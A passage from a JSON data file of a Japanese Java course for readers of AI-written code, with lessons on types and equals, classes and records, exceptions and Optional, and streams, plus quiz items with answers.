        "question": "`int a = 1, b = 2;` のとき、`\"答え \" + a + b` の結果は？",
        "choices": [
         "答え 3",
         "答え 12",
         "エラー"
        ],
        "answer": 1,
        "explain": "左から順に計算され、\"答え \" + 1 で文字列 \"答え 1\" になってから 2 がつながります。足し算を先にするなら `\"答え \" + (a + b)` です。"
       }
      ]
     ],
     "id": "01-class-main"
    },
    {
     "title": "静的型と変数 ― int と Integer、== と equals",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "types",
      "variables",
      "operators"
     ],
     "summary": "int・double・String・boolean の宣言と var、整数のあふれ、プリミティブ型とラッパー型（int と Integer）、そして Java 最大の落とし穴「文字列を == で比べてはいけない」と NullPointerException を実際の結果で。",
     "body": "## このレッスンのゴール\n\n- `int price = 120;` や `var` での変数の宣言を読める\n- 整数があふれる・整数の割り算が切り捨てになることが分かる\n- 文字列を `==` ではなく `equals` で比べる理由を、実際の結果で説明できる\n\n## 変数の宣言\n\n```java\nint price = 120;\ndouble rate = 0.1;\nString name = \"Ryo\";\nboolean isOpen = true;\nchar c = 'あ';\nvar fruits = List.of(\"りんご\", \"バナナ\");   // 型は右から推論される（Java 10 から）\nfinal int TAX = 10;                          // final は変えられない（定数）\n```\n\n**型を先に書く** のが Java の形です（C 言語と同じ。Go や Rust は後ろ）。`var` を使うと、型を書かずに右の値から決めてもらえます。\n\n| 型 | 中身 | Python で言うと |\n|---|---|---|\n| `int` | 整数（約 ±21 億まで） | `int` |\n| `long` | 大きな整数 | `int` |\n| `double` | 小数 | `float` |\n| `boolean` | `true` / `false` | `bool` |\n| `char` | 1 文字（シングルクォート `'あ'`） | — |\n| `String` | 文字列（ダブルクォート `\"...\"`） | `str` |\n\n## 計算の落とし穴\n\n```java\nSystem.out.println(7 / 2 + \" \" + 7 / 2.0 + \" \" + 7 % 2);   // 3 3.5 1\ndouble withTax = 120 * (1 + 0.1);\nSystem.out.println(withTax);                                // 132.0\n\nint big = Integer.MAX_VALUE;\nSystem.out.println(big + 1);                                // -2147483648\nlong l = 3_000_000_000L;\nSystem.out.println(l);                                      // 3000000000\n```\n\n| 結果 | 理由 |\n|---|---|\n| `7 / 2` が 3 | 整数どうしの割り算は切り捨て（Go・C・SQLite と同じ） |\n| `big + 1` が **マイナス** | int の上限（約 21 億）を超えると、**エラーにならずに反対側に回り込む**（オーバーフロー） |\n| `3_000_000_000L` | 大きな数は `long` で、末尾に `L`。`_` は読みやすくするための区切り |\n\n⚠️ オーバーフローはエラーにならないので気づきにくいバグです。売上の合計やミリ秒の時刻など、大きくなりうる数は `long` にします（Python の int には上限が無いので、起きません）。\n\n## プリミティブ型とラッパー型\n\nJava の型には 2 種類あります。\n\n| | プリミティブ型 | 参照型（オブジェクト） |\n|---|---|---|\n| 例 | `int`・`double`・`boolean`・`char` | `String`・`Integer`・`List`・自分で作ったクラス |\n| 名前 | **小文字** で始まる | **大文字** で始まる |\n| 中身 | 値そのもの | **値が置いてある場所への参照**（Go のポインタに近い） |\n| null | 入れられない | 入れられる（何も指していない） |\n\n`int` には、オブジェクト版の **`Integer`** があります（ラッパー型）。`List<int>` とは書けず、`List<Integer>` と書く必要があるので、Java のコードでは両方が混ざって出てきます。\n\n## ⚠️ == と equals\n\nJava を書く人が必ず一度はハマる、いちばん有名な落とし穴です。\n\n```java\nString a = \"りんご\";\nString b = \"りんご\";\nString c = new String(\"りんご\");\nString d = new StringBuilder(\"りん\").append(\"ご\").toString();\n\nSystem.out.println((a == b) + \" \" + (a == c) + \" \" + (a == d));   // true false false\nSystem.out.println(a.equals(c) + \" \" + a.equals(d));              // true true\n```\n\n**中身はどれも「りんご」なのに、`==` では false になるものがあります**。\n\n| 比べ方 | 何を比べるか |\n|---|---|\n| `==` | 参照型では **同じオブジェクト（同じ場所）か** |\n| `.equals(...)` | **中身が同じか** |\n\n`a` と `b` は、Java が同じ文字列を使い回したので、たまたま同じ場所でした。`c` と `d` は別に作られた文字列なので、場所が違います。**ユーザーの入力や、データベースから読んだ文字列は、たいてい別の場所** にあるので、`==` で比べると「同じパスワードなのに一致しない」のようなバグになります。\n\n**文字列（と、すべてのオブジェクト）は `equals` で比べる**。これが Java の鉄則です。\n\nPython の `==` は中身を比べ、`is` が場所を比べます。Java では **`==` が Python の `is`** に当たる、と覚えると分かりやすいです。\n\n### Integer でも起きる\n\n```java\nInteger x = 127, y = 127, p = 128, q = 128;\nSystem.out.println((x == y) + \" \" + (p == q) + \" \" + p.equals(q));   // true false true\n```\n\n127 までは Java が同じオブジェクトを使い回すので `==` が true、128 からは別のオブジェクトになって false でした。**テストで小さな数だけ試すと気づけない** ので、たちが悪いバグです。\n\n## null と NullPointerException\n\n```java\nString n = null;\nSystem.out.println(\"りんご\".equals(n));   // false\nSystem.out.println(n.equals(\"りんご\"));\n```\n\n```text\nException in thread \"main\" java.lang.NullPointerException: Cannot invoke \"String.equals(Object)\" because \"n\" is null\n\tat Eq.main(Eq.java:13)\n```\n\n参照型の変数には `null`（何も指していない）を入れられます。**null のままメソッドを呼ぶと、NullPointerException**（よく NPE と略される）で止まります。Java のプログラムでいちばんよく見る例外です。\n\nエラーの文が「n が null だから `String.equals` を呼べない」と、**どの変数が null だったか** まで教えてくれています（Java 14 から）。`at Eq.main(Eq.java:13)` が場所です。\n\n| 防ぎ方 | 例 |\n|---|---|\n| 定数の側から equals を呼ぶ | `\"りんご\".equals(n)`（n が null でも false で済む） |\n| null かどうかを確かめる | `if (n != null && n.equals(...))` |\n| `Objects.equals(a, b)` | どちらが null でも安全に比べる |\n| `Optional` を使う | レッスン 4 |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `if (name == \"admin\")` / `if (status == otherStatus)`（文字列） | ⚠️ equals に |\n| `Integer` どうしを `==` | ⚠️ 128 以上で false になる |\n| `int total` で売上の合計 | 大きくなりうるなら `long`（オーバーフロー） |\n| `input.equals(\"yes\")` で input が null かも | ⚠️ `\"yes\".equals(input)` の順に |\n| `var x = ...` | 型は右から決まる（型が無いわけではない） |\n| `final` | 再代入できない（Rust の let、JavaScript の const） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Java で、2 つの文字列の中身が同じか確かめる正しい書き方は？",
        "choices": [
         "`a == b`",
         "`a.equals(b)`",
         "`a = b`"
        ],
        "answer": 1,
        "explain": "`==` は同じオブジェクト（同じ場所）かを比べます。中身を比べるのは equals です。実際に、中身が同じでも `==` が false になる例がありました。"
       },
       {
        "question": "`int big = Integer.MAX_VALUE; big + 1` の結果は？",
        "choices": [
         "エラーで止まる",
         "2147483648",
         "-2147483648（オーバーフローして反対側に回り込む）"
        ],
        "answer": 2,
        "explain": "int の上限を超えると、エラーにならずにマイナスになります。大きくなりうる数は long を使います。"
       },
       {
        "question": "`String s = null; s.length();` を実行すると？",
        "choices": [
         "NullPointerException で止まる",
         "0 が返る",
         "null が返る"
        ],
        "answer": 0,
        "explain": "null の変数のメソッドを呼ぶと NullPointerException です。エラーの文には、どの変数が null だったかも表示されます。"
       }
      ]
     ],
     "id": "02-types-equals"
    },
    {
     "title": "クラス・インターフェース・record",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "classes",
      "types",
      "generics"
     ],
     "summary": "フィールドとコンストラクタと this、private と getter、@Override、extends と super、interface と default メソッド、データを入れるだけの record（Java 16 から）。Python の dataclass との比較。",
     "body": "## このレッスンのゴール\n\n- クラスのフィールド・コンストラクタ・メソッド・`this` を読める\n- `private` と getter、`@Override`、`extends`・`implements` の意味が分かる\n- `record` が何を自動で用意してくれるか説明できる\n\n## クラスの例\n\n```java\ninterface HasPrice {\n    int price();\n    default String label() { return price() + \" 円\"; }\n}\n\nclass Product implements HasPrice {\n    private final String name;\n    private int basePrice;\n\n    Product(String name, int basePrice) {\n        this.name = name;\n        this.basePrice = basePrice;\n    }\n\n    public String getName() { return name; }\n\n    @Override\n    public int price() { return basePrice * 110 / 100; }\n\n    void discount(int yen) {\n        if (yen > basePrice) throw new IllegalArgumentException(\"値引きが大きすぎます: \" + yen);\n        basePrice -= yen;\n    }\n\n    @Override\n    public String toString() { return name + \"（\" + price() + \" 円）\"; }\n}\n```\n\n```java\nProduct apple = new Product(\"りんご\", 120);\nSystem.out.println(apple.getName() + \" \" + apple.price() + \" \" + apple.label());   // りんご 132 132 円\napple.discount(20);\nSystem.out.println(apple);                                                         // りんご（110 円）\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `private final String name;` | **フィールド**（オブジェクトが持つデータ）。private で外から見えず、final で変えられない | `self._name`（ただし本当に見えない） |\n| `Product(String name, int basePrice) { ... }` | **コンストラクタ**。クラスと同じ名前で、戻り値の型を書かない | `__init__` |\n| `this.name = name;` | 自分のフィールドに、引数の値を入れる | `self.name = name` |\n| `new Product(...)` | 作る | `Product(...)` |\n| `public String getName()` | **getter**。private のフィールドを読むためのメソッド | `@property` |\n| `@Override` | 「親やインターフェースのメソッドを上書きしています」という印。名前を打ち間違えるとコンパイルエラーにしてくれる | — |\n| `toString()` | 表示の仕方（`println(apple)` で使われる） | `__str__` |\n| `throw new IllegalArgumentException(...)` | 例外を投げる（レッスン 4） | `raise ValueError(...)` |\n\n### private と getter\n\n```java\nSystem.out.println(p.basePrice);\n```\n\n```text\nPriv.java:2: error: basePrice has private access in Product\n```\n\nPHP（PHP コースのレッスン 3）と同じく、private は **コンパイルエラー** になります。Java では、フィールドを private にして、必要なものだけ `getName()` のような getter で読めるようにする（**カプセル化**）のが定番です。AI の Java のコードに `getXxx()` / `setXxx()` がたくさん並んでいるのはこのためです。\n\n## 継承\n\n```java\nclass Set extends Product {\n    Set(String name, int basePrice) { super(name, basePrice); }\n\n    @Override\n    public int price() { return super.price() - 50; }\n}\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `class Set extends Product` | Product を継承 | `class Set(Product):` |\n| `super(name, basePrice)` | 親のコンストラクタを呼ぶ | `super().__init__(...)` |\n| `super.price()` | 親のメソッドを呼ぶ | `super().price()` |\n\nJava のクラスは、**親を 1 つしか持てません**（多重継承できない）。その代わりに、インターフェースを何個でも実装できます。\n\n## インターフェース\n\n```java\ninterface HasPrice {\n    int price();                                         // 中身の無いメソッド：必ず実装する\n    default String label() { return price() + \" 円\"; }   // default：中身付き。実装しなくてよい\n}\n```\n\n```java\nList<HasPrice> items = new ArrayList<>();\nitems.add(apple);\nitems.add(new Set(\"詰め合わせ\", 1000));\nfor (HasPrice item : items) {\n    System.out.println(item + \" / \" + item.getClass().getSimpleName());\n}\n// りんご（110 円） / Product\n// 詰め合わせ（1050 円） / Set\n```\n\n`List<HasPrice>` には、HasPrice を実装したものなら何でも入れられます。Rust のトレイト（Rust コースのレッスン 5）の `Vec<Box<dyn Shape>>` と同じ考え方で、Java は最初からこれが普通にできます。\n\n| 言語 | 「このメソッドを持つ」の約束 | 宣言の仕方 |\n|---|---|---|\n| Java | `interface` | `implements HasPrice`（明示） |\n| Go | `interface` | 書かない（メソッドがあれば自動） |\n| Rust | `trait` | `impl Shape for Rect`（明示） |\n| Python | `Protocol` / 抽象クラス | 書かなくてもよい（ダックタイピング） |\n\n## record：データを入れるだけのクラス\n\n```java\nrecord Point(int x, int y) {\n    double distance() { return Math.sqrt(x * x + y * y); }\n}\n\nPoint p = new Point(3, 4);\nSystem.out.println(p + \" \" + p.x() + \" \" + p.distance() + \" \" + p.equals(new Point(3, 4)));\n// Point[x=3, y=4] 3 5.0 true\n```\n\n`record`（Java 16 から）は、1 行書くだけで、**コンストラクタ・getter（`x()`）・`toString`・`equals`・`hashCode` を自動で作ってくれます**。中身は変えられません。\n\nPython の `@dataclass(frozen=True)`、Rust の `#[derive(Debug, Clone, PartialEq)]` とほぼ同じです。前のレッスンの「equals で比べる」も、record なら中身で比べてくれます（`p.equals(new Point(3, 4))` が true）。\n\n昔の Java では、同じことをするのに 30 行くらい（フィールド・コンストラクタ・getter・equals・hashCode・toString）書いていました。AI のコードや古いコードで、**Lombok** の `@Data`・`@Getter` というアノテーションを見たら、それを自動で作るためのライブラリです。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `private final UserRepository repository;` ＋ コンストラクタで受け取る | 必要な部品を外から受け取る（依存性注入。レッスン 6） |\n| `getName()` / `setName(...)` が並ぶ | getter・setter。private のフィールドを読み書きする窓口 |\n| `@Data` / `@Getter` / `@Builder`（Lombok） | getter などを自動で作る |\n| `public record UserDto(String name, String email) {}` | API で受け渡すデータの形（DTO） |\n| `abstract class` | 一部のメソッドの中身を子に任せる親クラス（そのままでは new できない） |\n| `equals` を上書きしているのに `hashCode` を上書きしていない | ⚠️ HashMap などで正しく動かない。両方そろえる（record なら自動） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Java のクラスで、コンストラクタの見分け方は？",
        "choices": [
         "クラスと同じ名前で、戻り値の型が書かれていないメソッド",
         "`__init__` という名前のメソッド",
         "`constructor` というキーワードで始まるもの"
        ],
        "answer": 0,
        "explain": "`Product(String name, int price) { ... }` のように、クラス名と同じで戻り値の型が無いものがコンストラクタです。"
       },
       {
        "question": "`@Override` を付ける主な理由は？",
        "choices": [
         "メソッドを速くするため",
         "親やインターフェースのメソッドを上書きしていることを示し、名前の打ち間違いをコンパイルエラーにしてもらうため",
         "メソッドを private にするため"
        ],
        "answer": 1,
        "explain": "`@Override` を付けたのに上書きする元が無ければ、コンパイラが教えてくれます。"
       },
       {
        "question": "`record Point(int x, int y) {}` が自動で用意してくれないものは？",
        "choices": [
         "`x()` と `y()` で値を読むメソッド",
         "中身で比べる `equals`",
         "x の値を後から変える `setX` メソッド"
        ],
        "answer": 2,
        "explain": "record の中身は変えられません。コンストラクタ・読むメソッド・equals・hashCode・toString は自動で作られます。"
       }
      ]
     ],
     "id": "03-classes-interfaces"
    },
    {
     "title": "例外処理 ― try・catch・throws と Optional",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "errors",
      "io"
     ],
     "summary": "try・catch・finally、自分の例外クラス、Java だけの「検査例外」（throws を書かないとコンパイルできない）、try-with-resources での後片付け、スタックトレースの読み方、null の代わりの Optional と、Integer の null で起きる NPE。",
     "body": "## このレッスンのゴール\n\n- `try / catch / finally` と `throw new ...` を読める\n- 検査例外と非検査例外の違い、`throws` の意味が分かる\n- `try (...)`（try-with-resources）と `Optional` を読める\n\n## try・catch・finally\n\n```java\ntry {\n    int n = Integer.parseInt(\"12a\");\n} catch (NumberFormatException e) {\n    System.out.println(\"数ではありません: \" + e.getMessage());\n}\n// 数ではありません: For input string: \"12a\"\n```\n\nPython の `try / except` とほぼ同じです。\n\n| Java | Python |\n|---|---|\n| `try { ... }` | `try:` |\n| `catch (NumberFormatException e) { ... }` | `except ValueError as e:` |\n| `finally { ... }` | `finally:` |\n| `throw new IllegalArgumentException(\"...\")` | `raise ValueError(\"...\")` |\n| `e.getMessage()` | `str(e)` |\n\nGo や Rust はエラーを **戻り値** で返しましたが、Java は Python と同じく **例外** で伝えます。\n\n## 自分の例外\n\n```java\nstatic class NotFoundException extends RuntimeException {\n    NotFoundException(String msg) { super(msg); }\n}\n\nstatic int findPrice(String name) {\n    Map<String, Integer> prices = Map.of(\"りんご\", 120);\n    Integer p = prices.get(name);\n    if (p == null) throw new NotFoundException(\"商品が見つかりません: \" + name);\n    return p;\n}\n\ntry {\n    findPrice(\"ぶどう\");\n} catch (NotFoundException e) {\n    System.out.println(\"→ 404: \" + e.getMessage());\n} finally {\n    System.out.println(\"finally は必ず実行\");\n}\n```\n\n```text\n→ 404: 商品が見つかりません: ぶどう\nfinally は必ず実行\n```\n\n`RuntimeException` を継承（レッスン 3）して、自分の種類の例外を作っています。Web のアプリでは、「NotFoundException なら 404」のように、種類で返事を変えるのに使います（レッスン 6）。\n\n## 検査例外：Java だけの決まり\n\n```java\nstatic String f() {\n    return new BufferedReader(new FileReader(\"x\")).readLine();\n}\n```\n\n```text\nChk.java:2: error: unreported exception FileNotFoundException; must be caught or declared to be thrown\nChk.java:2: error: unreported exception IOException; must be caught or declared to be thrown\n```\n\nファイルを読む処理は、**try / catch で受け止めるか、「この関数は例外を投げます」と宣言するか** しないと、**コンパイルできません**。「ファイルが無い」「読めない」は、ちゃんと考えておくべき失敗だから、というのが Java の考え方です。\n\n```java\nstatic String readFirstLine(String path) throws IOException {    // ← 宣言する\n    try (BufferedReader r = new BufferedReader(new FileReader(path))) {\n        return r.readLine();\n    }\n}\n```\n\n`throws IOException` は「この関数は IOException を投げることがあるので、**呼ぶ人が対応してね**」という宣言です。\n\n| | 検査例外（checked） | 非検査例外（unchecked） |\n|---|---|---|\n| 例 | `IOException`、`SQLException` | `RuntimeException` の仲間：`NullPointerException`、`IllegalArgumentException`、`NumberFormatException` |\n| 対応しないと | **コンパイルエラー** | コンパイルは通る（実行時に止まる） |\n| 意味 | 外の世界の事情で起きる、考えておくべき失敗 | プログラムのバグや、入力の間違い |\n\nPython にも Go にも Rust にも、この区別はありません。Go の「エラーを必ず戻り値で返す」、Rust の「Result を必ず扱う」と、目的は似ています。\n\n## try-with-resources：後片付けを自動で\n\n```java\ntry (BufferedReader r = new BufferedReader(new FileReader(path))) {\n    return r.readLine();\n}   // ← ここで r.close() が自動で呼ばれる（例外が起きても）\n```\n\n`try (...)` のかっこの中で開いたものは、**ブロックを抜けるときに自動で閉じられます**。Python の `with open(...) as f:`、Go の `defer f.Close()`、シェルの `trap` と同じ役割です。データベースの接続やファイルは、この形で開くのが今の Java の定番です。\n\n```java\ntry {\n    readFirstLine(\"config.toml\");\n} catch (IOException e) {\n    System.out.println(e.getClass().getSimpleName() + \": \" + e.getMessage());\n}\n// FileNotFoundException: config.toml (No such file or directory)\n```\n\n## スタックトレースの読み方\n\n```java\napple.discount(9999);\n```\n\n```text\nException in thread \"main\" java.lang.IllegalArgumentException: 値引きが大きすぎます: 9999\n\tat Product.discount(Shop.java:24)\n\tat Shop.main(Shop.java:56)\n```\n\n| 行 | 意味 |\n|---|---|\n| 1 行目 | **例外の種類とメッセージ**。まずここを読む |\n| `at Product.discount(Shop.java:24)` | 例外が起きた場所（Shop.java の 24 行目、Product の discount） |\n| `at Shop.main(Shop.java:56)` | それを呼んだ場所 |\n\n**上ほど、例外が起きた場所に近い** 順に並んでいます。Python のトレースバック（下ほど近い）と **逆** なので注意です（はじめてのコースの「エラーメッセージ」）。本物のアプリでは、ライブラリの行が何十行も続くので、**自分のパッケージ名（`com.example...`）の行を探す** のがコツです。\n\n## Optional：null の代わり\n\n```java\nstatic Optional<Integer> findPriceOpt(String name) {\n    return Optional.ofNullable(Map.of(\"りんご\", 120).get(name));\n}\n\nSystem.out.println(findPriceOpt(\"ぶどう\").orElse(0) + \" \" +\n                   findPriceOpt(\"りんご\").map(p -> p * 2).orElse(0));\n// 0 240\n```\n\n`Optional<Integer>` は「Integer があるかもしれないし、無いかもしれない」入れ物です。Rust の `Option`（Rust コースのレッスン 3）と同じ考え方を、Java 8 で取り入れたものです。\n\n| Java | Rust | 意味 |\n|---|---|---|\n| `Optional.of(x)` / `Optional.empty()` | `Some(x)` / `None` | ある／無い |\n| `.orElse(0)` | `.unwrap_or(0)` | 無ければ 0 |\n| `.map(p -> p * 2)` | `.map(\\|p\\| p * 2)` | あれば変換 |\n| `.orElseThrow()` | `.unwrap()` | 無ければ例外 |\n| `.isPresent()` | `.is_some()` | あるか |\n\n### ⚠️ Integer の null\n\n```java\nInteger missing = Map.of(\"りんご\", 120).get(\"ぶどう\");   // 無いので null\nint total = missing + 10;\n```\n\n```text\nException in thread \"main\" java.lang.NullPointerException: Cannot invoke \"java.lang.Integer.intValue()\" because \"missing\" is null\n```\n\n`Map.get` は、無いキーで **null** を返します。それを `int` として計算しようとして（Java が裏で `intValue()` を呼ぶ）、NPE になりました。コードの見た目には「メソッドを呼んでいる」部分が無いので、気づきにくい NPE です。`getOrDefault(\"ぶどう\", 0)` や Optional を使うと防げます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `catch (Exception e) { }`（中が空） | ⚠️ 例外を握りつぶしている。失敗に気づけない |\n| `catch (Exception e) { e.printStackTrace(); }` | 表示だけして先に進む。続けて大丈夫か |\n| `throws Exception` が main やあちこちに | 検査例外を考えずに全部上に投げている |\n| `try (Connection c = ...; PreparedStatement s = ...)` | ✅ 2 つとも自動で閉じる |\n| `optional.get()` | ⚠️ 空なら例外。`orElse` などに |\n| `throw new RuntimeException(e)` | 検査例外を非検査例外に包み直している（よくある形） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`static String read(String path) throws IOException` の `throws IOException` の意味は？",
        "choices": [
         "この関数は IOException を絶対に投げない",
         "この関数は IOException を投げることがあるので、呼ぶ側が対応する必要がある",
         "IOException を自動で受け止める"
        ],
        "answer": 1,
        "explain": "検査例外は、受け止めるか throws で宣言しないとコンパイルできません。throws を書くと、対応する責任が呼ぶ側に移ります。"
       },
       {
        "question": "`try (BufferedReader r = new BufferedReader(...)) { ... }` の利点は？",
        "choices": [
         "ブロックを抜けるとき、例外が起きても r が自動で閉じられる",
         "ファイルを速く読める",
         "例外が起きなくなる"
        ],
        "answer": 0,
        "explain": "try-with-resources は、Python の `with` に当たります。閉じ忘れを防ぎます。"
       },
       {
        "question": "Java のスタックトレースで、例外が実際に起きた場所に近いのは？",
        "choices": [
         "上のほうの `at ...` の行",
         "下のほうの `at ...` の行",
         "最後の行"
        ],
        "answer": 0,
        "explain": "Java は上ほど起きた場所に近い順です。Python のトレースバックとは逆なので注意します。"
       }
      ]
     ],
     "id": "04-exceptions"
    },
    {
     "title": "コレクションと Stream",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "collections",
      "higher_order",
      "generics"
     ],
     "summary": "List・Map とジェネリクス <String>、List.of は変更できない、ループの中で消すと起きること、Stream の filter・map・collect、groupingBy での集計、Comparator での並べ替え、メソッド参照 Product::name。SQL や Python と並べて読む。",
     "body": "## このレッスンのゴール\n\n- `List<String>`・`Map<String, Integer>` とよく使う操作を読める\n- `.stream().filter(...).map(...).collect(...)` を左から順に説明できる\n- `Collectors.groupingBy` での集計と、`Product::name` のようなメソッド参照が分かる\n\n## List と Map\n\n```java\nList<String> fruits = new ArrayList<>(List.of(\"りんご\", \"バナナ\"));\nfruits.add(\"みかん\");\nSystem.out.println(fruits + \" \" + fruits.get(0) + \" \" + fruits.size() + \" \" + fruits.contains(\"バナナ\"));\n// [りんご, バナナ, みかん] りんご 3 true\n\nMap<String, Integer> stock = new HashMap<>();\nstock.put(\"りんご\", 10);\nstock.merge(\"りんご\", 5, Integer::sum);\nstock.merge(\"バナナ\", 3, Integer::sum);\nSystem.out.println(stock.get(\"りんご\") + \" \" + stock.get(\"ぶどう\") + \" \" + stock.getOrDefault(\"ぶどう\", 0));\n// 15 null 0\n```\n\n| Java | Python |\n|---|---|\n| `List<String> x = new ArrayList<>()` | `x: list[str] = []` |\n| `x.add(v)` / `x.get(0)` / `x.size()` | `x.append(v)` / `x[0]` / `len(x)` |\n| `Map<String, Integer> m = new HashMap<>()` | `m: dict[str, int] = {}` |\n| `m.put(k, v)` / `m.get(k)` | `m[k] = v` / `m.get(k)` |\n| `m.getOrDefault(k, 0)` | `m.get(k, 0)` |\n| `m.merge(k, 5, Integer::sum)` | `m[k] = m.get(k, 0) + 5`（数える定番。Rust の `entry().or_insert()`） |\n\n`<String>` の部分が **ジェネリクス**（TypeScript・Rust と同じ）で、「String を入れる List」という意味です。`new ArrayList<>()` の `<>` は、左から型を推論してもらう書き方です。\n\n`List`・`Map` はインターフェース（レッスン 3）、`ArrayList`・`HashMap` はその実装です。**左にインターフェース、右に実装** と書くのが定番です。\n\n### List.of は変更できない\n\n```java\nList<String> fixed = List.of(\"a\");\nfixed.add(\"b\");\n// UnsupportedOperationException\n```\n\n`List.of(...)`・`Map.of(...)` で作ったものは **中身を変えられません**（イミュータブル）。変えたいなら `new ArrayList<>(List.of(...))` で、変えられる List に入れ直します（上の fruits はこの形）。\n\n### ⚠️ ループの中で消す\n\n```java\nList<Integer> x = new ArrayList<>(List.of(1, 2, 3));\nfor (Integer n : x) { if (n == 1) x.remove(n); }\n// ConcurrentModificationException\n\nList<Integer> y = new ArrayList<>(List.of(1, 2, 3));\nfor (Integer n : y) { if (n == 2) y.remove(n); }\n// エラーなし。y は [1, 3]（3 は一度もループで見られていない）\n```\n\nfor で回している最中に List から消すと、**例外になることもあれば、エラーにならずに要素を飛ばしてしまうこともあります**（どちらも実際に起きた結果です）。消すときは `removeIf` を使います。\n\n```java\nnums.removeIf(n -> n == 3);\n```\n\nPython でもループ中に `list.remove` すると要素を飛ばすので、同じ注意が必要です。\n\n## Stream：データの流れ作業\n\nこのコースの商品のデータで試します（SQL コースと同じ 6 つの商品）。\n\n```java\nrecord Product(String name, String category, int price) {}\n\nList<String> cheap = products.stream()\n    .filter(p -> p.price() < 200)\n    .map(Product::name)\n    .collect(Collectors.toList());\nSystem.out.println(cheap);                         // [りんご, バナナ, クロワッサン]\n\nint total = products.stream().mapToInt(Product::price).sum();\nSystem.out.println(total);                         // 2040\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `.stream()` | 流れ作業を始める | — |\n| `.filter(p -> p.price() < 200)` | 条件に合うものだけ | `if p.price < 200` |\n| `.map(Product::name)` | 1 つずつ変換 | `p.name for ...` |\n| `.collect(Collectors.toList())` / `.toList()` | List に集める | `[...]` |\n| `.mapToInt(...).sum()` | 数にして合計 | `sum(...)` |\n| `p -> p.price() < 200` | **ラムダ式**（その場の関数） | `lambda p: p.price < 200` |\n| `Product::name` | **メソッド参照**。`p -> p.name()` の短い書き方 | `attrgetter(\"name\")` |\n\nPython で書くと `[p.name for p in products if p.price < 200]`。JavaScript の `products.filter(...).map(...)`、Rust の `.iter().filter(...).map(...).collect()` と、**どの言語もほぼ同じ形** です。\n\n### groupingBy：グループごとに集計\n\n```java\nMap<String, Long> countByCat = products.stream()\n    .collect(Collectors.groupingBy(Product::category, TreeMap::new, Collectors.counting()));\nSystem.out.println(countByCat);    // {パン=2, 果物=2, 飲み物=2}\n\nMap<String, Double> avgByCat = products.stream()\n    .collect(Collectors.groupingBy(Product::category, TreeMap::new, Collectors.averagingInt(Product::price)));\nSystem.out.println(avgByCat);      // {パン=215.0, 果物=105.0, 飲み物=700.0}\n```\n\nSQL コースのレッスン 3 の結果と、まったく同じ数になっています。\n\n```sql\nSELECT category, COUNT(*), AVG(price) FROM products GROUP BY category;\n```\n\n| groupingBy の引数 | 意味 |\n|---|---|\n| `Product::category` | 何でグループに分けるか（`GROUP BY category`） |\n| `TreeMap::new` | 結果をキーの順に並べた Map にする（無ければ HashMap で順番はばらばら） |\n| `Collectors.counting()` / `averagingInt(...)` | グループごとに何を計算するか（`COUNT(*)` / `AVG(price)`） |\n\n### 並べ替え・最大\n\n```java\nOptional<Product> top = products.stream().max(Comparator.comparingInt(Product::price));\nSystem.out.println(top.map(Product::name).orElse(\"なし\"));    // コーヒー豆\n\nList<Product> sorted = products.stream()\n    .sorted(Comparator.comparing(Product::category)\n                      .thenComparing(Product::price, Comparator.reverseOrder()))\n    .toList();\n// 食パン クロワッサン りんご バナナ コーヒー豆 牛乳\n```\n\n`Comparator.comparing(...).thenComparing(..., reverseOrder())` は、SQL の `ORDER BY category, price DESC`（SQL コースのレッスン 2）と同じで、結果の順番も同じでした。`max` は空かもしれないので、レッスン 4 の Optional で返ってきます。\n\n```java\nString joined = products.stream().map(Product::name).limit(3).collect(Collectors.joining(\"、\"));\n// りんご、バナナ、牛乳\n```\n\n`limit(3)` は SQL の `LIMIT 3`、`joining(\"、\")` は Python の `\"、\".join(...)` です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `.stream().filter(...).map(...).toList()` | 絞って変換して List に |\n| `Collectors.groupingBy(X::getY)` | Y ごとにまとめた Map |\n| `.forEach(System.out::println)` | 1 つずつ表示 |\n| `.findFirst().orElseThrow()` | 最初の 1 つ。無ければ例外 |\n| ループの中で `list.remove(...)` | ⚠️ 例外か、要素の飛ばし。`removeIf` に |\n| `List.of(...)` に `add` | ⚠️ UnsupportedOperationException |\n| `.parallelStream()` | 複数のスレッドで並行に処理。中で共有の変数を書き換えるとデータ競合（Go コースのレッスン 5） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`products.stream().filter(p -> p.price() < 200).map(Product::name).toList()` を Python で書くと？",
        "choices": [
         "`[p.name for p in products if p.price < 200]`",
         "`[p for p in products if p.name < 200]`",
         "`sum(p.price for p in products)`"
        ],
        "answer": 0,
        "explain": "filter で値段が 200 未満のものに絞り、map で名前に変換して List に集めています。"
       },
       {
        "question": "`Product::name` は何の短い書き方？",
        "choices": [
         "Product クラスの name というフィールドを直接読む",
         "`p -> p.name()`（各要素の name メソッドを呼ぶラムダ式）",
         "Product の静的な定数 name"
        ],
        "answer": 1,
        "explain": "`クラス::メソッド` はメソッド参照で、ラムダ式を短く書いたものです。"
       },
       {
        "question": "`Collectors.groupingBy(Product::category, Collectors.counting())` に当たる SQL は？",
        "choices": [
         "`SELECT category FROM products ORDER BY category`",
         "`SELECT category, COUNT(*) FROM products GROUP BY category`",
         "`SELECT COUNT(DISTINCT category) FROM products`"
        ],
        "answer": 1,
        "explain": "category でグループに分け、グループごとの数を数えています。実際の結果も SQL コースと同じでした。"
       }
      ]
     ],
     "id": "05-collections-stream"
    },
    {
     "title": "Spring Boot のコードを読む ― アノテーションだらけの API",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "backend",
      "http_api",
      "reading",
      "ai_coding"
